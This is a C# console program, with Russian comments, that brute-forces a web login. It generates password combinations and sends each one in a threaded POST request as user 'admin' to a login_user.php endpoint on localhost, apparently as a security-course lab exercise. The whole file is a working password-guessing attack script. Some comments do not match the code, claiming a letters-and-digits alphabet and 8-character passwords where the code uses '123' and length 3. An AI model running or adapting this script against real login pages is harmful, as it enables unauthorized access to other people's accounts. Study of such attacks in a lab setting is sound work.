using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace BruteForce
{
    internal class Program
    {
        // Невладильный токен для сравнения с ответом сервера
        public static string InvalidToken = "4439f14af03c1454a886a3b24101197e";

        // Адфайл для генерации паролей: заглавные, строчные буквы и цифры
        public static string Abc = "123";

        // Делегат для обработки паролей (объявление типа)
        public delegate void PasswordHandler(string password);

        // Время начала работы программы для отслеживания времени выполнения
        public static DateTime Start;

        static void Main(string[] args)
        {
            // Записываем время начала работы программы
            Start = DateTime.Now;

            // Запускаем генерацию паролей длиной 8 символов
            // И для каждого сгенерированного пароля вызываем CheckPassword
            CreatePassword(3, CheckPassword);
        }

        // Метод для отправки запроса на авторизацию с паролем
        public static void SingIn(string password)
        {
            try
            {
                // URL endpoint для авторизации
                string url = "http://localhost/security.permaviat.ru-14/security.permaviat.ru-14/ajax/login_user.php";

                // Создаем HTTP запрос
                HttpWebRequest Request = (HttpWebRequest)WebRequest.Create(url);
                // Устанавливаем метод запроса как POST
                Request.Method = "POST";
                // Указываем тип передаваемых данных
                Request.ContentType = "application/x-www-form-urlencoded";

                // Формируем данные для отправки (логин веса админ, пароль подбирается)
                string PostData = $"login=admin&password={password}";
                // Преобразуем строку в массив байтов для отправки
                byte[] Data = Encoding.ASCII.GetBytes(PostData);
            // Устанавливаем длину контакта
            Request.ContentLength = Data.Length;

            // Записываем данные в поток запроса
            using (var stream = Request.GetRequestStream())
            {
                stream.Write(Data, 0, Data.Length);
            }

            // Получаем ответ от сервера
            HttpWebResponse Response = (HttpWebResponse)Request.GetResponse();

            // Читаем ответ сервера
            string ResponseFromServer = new StreamReader(Response.GetResponseStream()).ReadToEnd();
            // Проверяем, является ли токен невалидным
            string Status = ResponseFromServer == InvalidToken ? "FALSE" : "TRUE";
    
            // Вычисляем время, прошедшее с начала работы
            TimeSpan Delta = DateTime.Now.Subtract(Start);
                // Выводим результат проверки пароля
                Console.WriteLine(Delta.ToString(@"hh\mm\ss") + $": {password} - {Status}");
            }
            catch (Exception exp)
            {
                // В случае ошибки выводим сообщение и повторяем попытку
                TimeSpan Delta = DateTime.Now.Subtract(Start);
                Console.WriteLine(Delta.ToString(@"hh\mm\ss") + $": {password} - ошибка");
                // Рекурсивный повторный вызов (может привести к бесконечному циклу при постоянных ошибках)
                SingIn(password);
            }
        }

        // Метод для запуска проверки пароля в отдельном потоке
        public static void CheckPassword(string password)
        {
            // Создаем новый поток для выполнения запроса
            Thread thread = new Thread(() => SingIn(password));
            // Запускаем поток
            thread.Start();
        }

        // Метод для генерации всех возможных комбинаций паролей заданной длины
        public static void CreatePassword(int numberChar, Action<string> processPassword)
        {
            char[] chars = Abc.ToCharArray();
            int[] indices = new int[numberChar];
            long totalCombinations = (long)Math.Pow(chars.Length, numberChar);

            for (int i = 0; i < totalCombinations; i++)
            {
                StringBuilder password = new StringBuilder(numberChar);
                for (int j = 0; j < numberChar; j++)
                    password.Append(chars[indices[j]]);

                processPassword(password.ToString());

                // Правильное обновление индексов (как счетчик)
                for (int j = numberChar - 1; j >= 0; j--)
                {
                    indices[j]++;
                    if (indices[j] < chars.Length)
                        break;
                    indices[j] = 0;
                }
            }
        }
    }
}
